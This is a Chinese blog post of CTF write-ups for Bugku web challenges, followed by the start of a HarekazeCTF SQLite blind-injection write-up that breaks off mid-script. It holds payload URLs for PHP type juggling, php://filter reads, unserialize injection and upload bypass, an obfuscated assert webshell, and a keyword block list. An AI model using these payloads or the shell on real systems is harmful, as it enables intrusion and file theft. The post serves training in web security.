<p>修改url，进入的是ctf的主页，在viewsource中修改代码，得到了另一个网页的源代码，查找得到<br>
可能是重定向。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">LANGUAGE</span>=<span class="string">"Javascript"</span>&gt;</span></span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> Words =<span class="string">"%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A</span></span></span><br><span class="line">%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI</span><br><span class="line">3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCU</span><br><span class="line">zRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQ</span><br><span class="line">lNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0Q</span><br><span class="line">lMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI</span><br><span class="line">5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTN</span><br><span class="line">CJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW5</span><br><span class="line">0cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyU</span><br><span class="line">yMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3R</span><br><span class="line">ybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJ</span><br><span class="line">DMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTI</span><br><span class="line">xJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCU</span><br><span class="line">wQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB</span><br><span class="line">1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"</span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">OutWord</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> NewWords;</span></span><br><span class="line"><span class="javascript">NewWords = <span class="built_in">unescape</span>(Words);<span class="comment">//unescape()函数可对通过 escape()编码的字符串进行解码。</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//该函数的工作原理是这样的：通过找到形式为 %xx 和 %uxxxx 的字符序列（x 表示十六进制的数字），</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//用 Unicode 字符 \u00xx 和 \uxxxx 替换这样的字符序列进行解码。</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(NewWords);</span></span><br><span class="line"><span class="javascript"><span class="comment">//把东西直接写道html页面里面</span></span></span><br><span class="line">&#125;</span><br><span class="line">OutWord();</span><br><span class="line"><span class="javascript"><span class="comment">// --&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>那个一大串的东西是url编码的东西（观察到开头和结尾部分可能是一对注释的头尾）。<br>
在python中解码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">a=<span class="string">"%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI</span></span><br><span class="line"><span class="string">3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCU</span></span><br><span class="line"><span class="string">zRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQ</span></span><br><span class="line"><span class="string">lNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0Q</span></span><br><span class="line"><span class="string">lMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI</span></span><br><span class="line"><span class="string">5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTN</span></span><br><span class="line"><span class="string">CJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW5</span></span><br><span class="line"><span class="string">0cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyU</span></span><br><span class="line"><span class="string">yMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3R</span></span><br><span class="line"><span class="string">ybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJ</span></span><br><span class="line"><span class="string">DMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTI</span></span><br><span class="line"><span class="string">xJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCU</span></span><br><span class="line"><span class="string">wQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB</span></span><br><span class="line"><span class="string">1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> urllib.unquote(a)</span><br></pre></td></tr></table></figure>
<p>这里面出来的是base64编码的东西，解码得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">";if(!$_GET['id'])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        header('Location: hello.php?id=1');</span></span><br><span class="line"><span class="string">        exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$id=$_GET['id'];</span></span><br><span class="line"><span class="string">$a=$_GET['a'];</span></span><br><span class="line"><span class="string">$b=$_GET['b'];</span></span><br><span class="line"><span class="string">if(stripos($a,'.'))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        echo 'no no no no no no no';</span></span><br><span class="line"><span class="string">        return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$data = @file_get_contents($a,'r');//file_get_contents - 将整个文件读入字符串</span></span><br><span class="line"><span class="string">if($data=="</span>bugku is a nice plateform!<span class="string">" and $id==0 and strlen($b)&gt;5 and eregi("</span><span class="number">111</span><span class="string">".substr($b,0,1),"</span><span class="number">1114</span><span class="string">") and substr($b,0,1)!=4)</span></span><br><span class="line"><span class="string">//eregi是正则匹配函数</span></span><br><span class="line"><span class="string">        require("</span>f4l2a3g.txt<span class="string">");</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        print "</span>never never never give up !!!<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>其实直接在url里面写一个f4l2a3g.txt就可以得到flag了</p>
<ul>
<li>正解如下：</li>
</ul>
<p>题目的意思是要满足以下条件：</p>
<ul>
<li>
<p>id不等于0</p>
</li>
<li>
<p>id弱等于0，那么查看php的表格发现字符串弱等于0，所以让id=“ijk”</p>
</li>
<li>
<p>b的第一个字符不等于4，又要让“111”.substr(b,0,1)和“1114”匹配起来。eregi函数可以用截断字符\x00绕过<br>
但是注意在输入url的时候\x00会被转码，导致url被截断。注意，虽然 b=%0012345 实际字符串长度为 8 字节，<br>
但在后台脚本读入数据时，会将 URL 编码 %00 转换成 1 字节。所以说，空字符应该在后台脚本的变量中出现，<br>
而不是在 URL 查询字符串变量中出现。</p>
</li>
<li>
<p>$data 是由 file_get_contents() 函数读取变量 $a 的值而得，所以 $a 的值必须为数据流。<br>
在服务器中自定义一个内容为 bugku is a nice plateform! 文件，再把此文件路径赋值给 $a，显然不太现实。<br>
伪协议 php:// 来访问输入输出的数据流，其中 php://input 可以访问原始请求数据中的只读流。</p>
</li>
</ul>
<p>所以构造如下：</p>
<pre><code>id=&quot;int&quot;&amp;b=%0012345&amp;a=php://input 并在burp的请求头中添加bugku is a nice plateform!
</code></pre>
<h2 id="welcome-to-the-bugkuctf">welcome to the bugkuctf</h2>
<p>进入源代码界面，file_get_contents说明得是数据流，看到hint.php,然后再检索框里面输入：</p>
<pre><code>index.php?txt=php://input&amp;file=hint.php
并且在burpsuite中添加welcome to thebugkuctf
</code></pre>
<p>得到的只是hint.php的效果界面，要看到hint的源码，要这样输入</p>
<pre><code>index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php
</code></pre>
<p>输出一堆base64编码，解码得到</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>同样的道理，使用<br>
index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=index.php</p>
<p>解码得到了index.php的源代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</span><br><span class="line">&#125;</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>
<p>显然这里不让我们再file中输入flag文件名。但是Flag类在构造对象的时候会执行构造函数，这个时候<br>
有机会echo出我们要的文件。但是要怎么利用password来传入我们要的对象呢？看到了unseialize反序列函数<br>
这个函数可以把对象从序列化的字符串还原出对象来.在PHP中,序列化用于存储或传递<em>PHP 的值</em>的过程中,同时不丢失其类型和结构</p>
<p>所以我们编写如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $file=<span class="string">'flag.php'</span></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Flag;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输出O:4:“Flag”:1:{s:4:“file”;s:8:“flag.php”;}</p>
<p>于是传入参数index.php?txt=welcome to the bugkuctf&amp;file=hint.php&amp;password=O:4:“Flag”:1:{s:4:“file”;s:8:“flag.php”;}</p>
<p>得到flag</p>
<h2 id="过狗一句话">过狗一句话</h2>
<p>刚开始给我们的php代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $poc=<span class="string">"a#s#s#e#r#t"</span>;</span><br><span class="line">$poc_1=explode(<span class="string">"#"</span>,$poc);</span><br><span class="line">$poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; $poc_2($_GET[<span class="string">'s'</span>])</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看意思explode就是根据第一参数的规则将目标划分为一个数组。那么pro2就是assert的意思<br>
assert（）一个东西，如果字符串会被当做代码执行，否则是false</p>
<p>以下解法<br>
试探一下：?index.php?s=phpinfo();//可以正常执行<br>
?index.php?s=print_r(scandir(./)) //./的意思应该是在当前目录下，scan扫描目录文件返回一个数组</p>
<pre><code>显示了flag所处的txt文件夹，之后用var_dump()或者show_source()或者直接访问都可以
</code></pre>
<h2 id="字符？正则？">字符？正则？</h2>
<p>打开网页，要求匹配的正则式子如下：</p>
<pre><code>  /key.*key.{4,7}key:\/.\/(.*key)[a-z][[:punct:]]/i
</code></pre>
<ul>
<li>
<p>/。。。。/这对东西标志正则表达式的开头和结尾，类似的还有#。。。#等</p>
</li>
<li>
<p>[[:punct:]] ：匹配任何标点符号；</p>
</li>
<li>
<p>/i  ：表示这个正则表达式对大小写不敏感；<br>
一开始我写的匹配对象是这样的：</p>
<pre><code>http://123.206.87.240:8002/web10/?id=keykey00000key://keyb.
</code></pre>
</li>
</ul>
<p>但是失败原因是在最后两个斜杠上，他们在url输入的时候前一个会充当转义作用，实际输入的只有一个/<br>
变成这样就好了：</p>
<pre><code>  http://123.206.87.240:8002/web10/?id=keykey00000key:///keyb.
</code></pre>
<h2 id="前女友">前女友</h2>
<p>打开源代码，发现在链接处有个链接，点进入是php代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v3'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">    <span class="keyword">if</span>($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!strcmp($v3, $flag))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>对于这里的md5，既可以采用md5碰撞的方法，也可以让两个变量都在输入的时候声明为数组得到false=false<br>
，对于这里的strcmp可以试试把v3声明为一个不符合数据类型的东西比如说整数，这样可以让函数返回0(仅对php5.3之前版本有效)</p>
<pre><code>http://123.206.31.85:49162/index.php?v1=s878926199a&amp;v2=s155964671a&amp;v3[]=1

或者

http://123.206.31.85:49162/index.php?v1[]=1&amp;v2[]=2&amp;v3[]=1
</code></pre>
<h2 id="login1">login1</h2>
<p>打开之后是登陆界面，提示说是sql约束攻击，具体博客教程看这里<a href="https://blog.csdn.net/wy_97/article/details/77972375" target="_blank" rel="noopener">sql约束攻击</a></p>
<p>总而言之为了创建一个新的admin，我们注册以下账户：</p>
<pre><code>username：admin                                            1
password：2017zxwlB
</code></pre>
<ul>
<li>
<p>注册的时候，会首先查看是否有相同的用户名，但是因为select查询语句并不对超出最大长度限<br>
制的检索对象进行尾部修剪，所以在这种情况下，我们注册的用户名在数据库中并不存在。</p>
</li>
<li>
<p>既然不存在，就会向表中插入这条新的用户数据，但是由于超出了varchar()所规定的长度，所以<br>
超出部分会被截断，这是第一重处理，接下来数据库会把有效字符后面的空格都删掉，这是第二重处理<br>
由此我们插入了一个admin用户，使用的是自己的密码就可以登陆</p>
</li>
</ul>
<p>登陆就好了。</p>
<h2 id="你从哪里来">你从哪里来</h2>
<p>题目说 你是从谷歌来的吗？，在burpsuite中添加referer:<a href="https://www.google.xn--com-3h9d0qu3w1rp" target="_blank" rel="noopener">https://www.google.com就可以了</a></p>
<h2 id="md5-collision">md5 collision</h2>
<p>从历史write up中记录的转化后的值为0的md5码中选两个出来作为参数就可以了</p>
<h2 id="程序员本地网站">程序员本地网站</h2>
<p>要求从本地访问，在burpsuite中添加一条x-forwarded-for:127.0.0.1就可以了！</p>
<h2 id="各种绕过">各种绕过</h2>
<p>打开网页之后看到的代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">$_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line">$flag = <span class="string">'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'uname'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">   <span class="keyword">if</span> ($_GET[<span class="string">'uname'</span>] == $_POST[<span class="string">'passwd'</span>])</span><br><span class="line"></span><br><span class="line">       <span class="keyword">print</span> <span class="string">'passwd can not be uname.'</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'uname'</span>]) === sha1($_POST[<span class="string">'passwd'</span>])&amp;($_GET[<span class="string">'id'</span>]==<span class="string">'margin'</span>))</span><br><span class="line"></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">'Flag: '</span>.$flag);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">print</span> <span class="string">'sorry!'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>sha1是散列算法函数，返回散列值。这里传入两个不符合数据类型的数据来让两个都返回false就可以做到相等<br>
，那么就让uname声明成为一个数组，并且用hackbar传一个数组类型的passwd进去。id=margin就行了。</p>
<h2 id="web8">web8</h2>
<p>打开网站显示代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);<span class="comment">//解析所有通过get方式获取的变量</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($ac))</span><br><span class="line">&#123;</span><br><span class="line">$f = trim(file_get_contents($fn));<span class="comment">//从打开fn所代表的文件，或者是文件流</span></span><br><span class="line"><span class="keyword">if</span> ($ac === $f)<span class="comment">//强等于</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span> .<span class="string">" $flag&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;sorry!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可知有两种解法：</p>
<ul>
<li>
<p>解法一：利用php://input传入fn一个值并让他和ac相等(这里很奇怪我的hackbar不能给php://input传数据，但是burpsuite应该可以)</p>
</li>
<li>
<p>解法二：根据题目提示，猜测有flag.txt在同级目录下，访问之看到文件内容显示flags，<br>
那么让ac=flags，fn=flag.txt就可以得到flag了。</p>
</li>
</ul>
<h2 id="细心">细心</h2>
<p>使用御剑软件扫描网站，发现有robots.txt,点进去显示</p>
<pre><code>User-agent: *
Disallow: /resusl.php
</code></pre>
<p>访问这个php文件试试，看到了显示里头警告不是管理员登陆，自己的ip已经被记录，第一反应是伪造本地访问</p>
<pre><code>Host: 127.0.0.1
Referer: 127.0.0.1
X-Forwarded-For: 127.0.0.1
Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
</code></pre>
<p>这几种方式都可以在burpsuite中进行修改来伪造本地访问。(但是题目的考点似乎并不在此)</p>
<p>接下来显示</p>
<pre><code>By bugkuctf.

if ($_GET[x]==$password) 此处省略1w字
</code></pre>
<p>试一试把x赋值成admin试一试？刚开始题目的文字信息就让我们试试构造了admin，果然有了flag</p>
<pre><code>robots.txt是一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被搜索引擎访
问的部分，或者指定搜索引擎只收录指定的内容。
当一个搜索引擎（又称搜索机器人或蜘蛛程序）访问一个站点时器人就会按照该文件中的内容来
确定访问的范围；如果该文件不存在，那么搜索机器人就沿着链接抓取。
</code></pre>
<h2 id="求getshell（文件上传类型）">求getshell（文件上传类型）</h2>
<p>打开页面，要求发送图片文件而不是php文件。看网上说是黑名单过滤和类型检测，但是可以把<br>
content-type 进行大小写绕过和类型修改，并且修改php文件的后缀名，可以修改成以下几种</p>
<pre><code>php2, php3, php4, php5, phps, pht, phtm, phtml
</code></pre>
<p>试了以上几种之后，php5可以拿到flag。</p>
]]></content>
  </entry>
  <entry>
    <title>sqlite3 类型的sql注入</title>
    <url>/2020/01/21/sql-injection-sqlite3/</url>
    <content><![CDATA[<h2 id="HarekazeCTF2019-Sqlite-Voting">HarekazeCTF2019 Sqlite Voting</h2>
<p>开局界面</p>
<p><img src="/images/image-20200121150535259.png" alt="image-20200121150535259"></p>
<p>vote.php的内容如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// dangerous chars</span></span><br><span class="line">    <span class="comment">// " % ' * + / &lt; = &gt; \ _ ` ~ -</span></span><br><span class="line">    <span class="string">"[\"%'*+\\/&lt;=&gt;\\\\_`~-]"</span>,</span><br><span class="line">    <span class="comment">// whitespace chars</span></span><br><span class="line">    <span class="string">'\s'</span>,</span><br><span class="line">    <span class="comment">// dangerous functions</span></span><br><span class="line">    <span class="string">'blob'</span>, <span class="string">'load_extension'</span>, <span class="string">'char'</span>, <span class="string">'unicode'</span>,</span><br><span class="line">    <span class="string">'(in|sub)str'</span>, <span class="string">'[lr]trim'</span>, <span class="string">'like'</span>, <span class="string">'glob'</span>, <span class="string">'match'</span>, <span class="string">'regexp'</span>,</span><br><span class="line">    <span class="string">'in'</span>, <span class="string">'limit'</span>, <span class="string">'order'</span>, <span class="string">'union'</span>, <span class="string">'join'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-Type: text/json; charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check user input</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'id'</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'You must specify vote id'</span>]));</span><br><span class="line">&#125;</span><br><span class="line">$id = $_POST[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_valid($id)) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'Vote id contains dangerous chars'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// update database</span></span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">'sqlite:../db/vote.db'</span>);</span><br><span class="line">$res = $pdo-&gt;query(<span class="string">"UPDATE vote SET count = count + 1 WHERE id = $&#123;id&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span> ($res === <span class="keyword">false</span>) &#123;</span><br><span class="line">  <span class="keyword">die</span>(json_encode([<span class="string">'error'</span> =&gt; <span class="string">'An error occurred while updating database'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// succeeded!</span></span><br><span class="line"><span class="keyword">echo</span> json_encode([</span><br><span class="line">  <span class="string">'message'</span> =&gt; <span class="string">'Thank you for your vote! The result will be published after the CTF finished.'</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure>
<p>是一个投票系统, 然后对可控参数id进行了很多的过滤, 下面是别人的脚本, 采用布尔盲注的手法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">'http://f4608be0-fa4f-4b6e-84f0-7731bc708034.node3.buuoj.cn/vote.php'</span></span><br><span class="line"></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">  r = requests.post(URL, data=&#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">f'abs(case(length(hex((select(flag)from(flag))))&amp;<span class="subst">&#123;<span class="number">1</span>&lt;&lt;j&#125;</span>)when(0)then(0)else(0x8000000000000000)end)'</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span 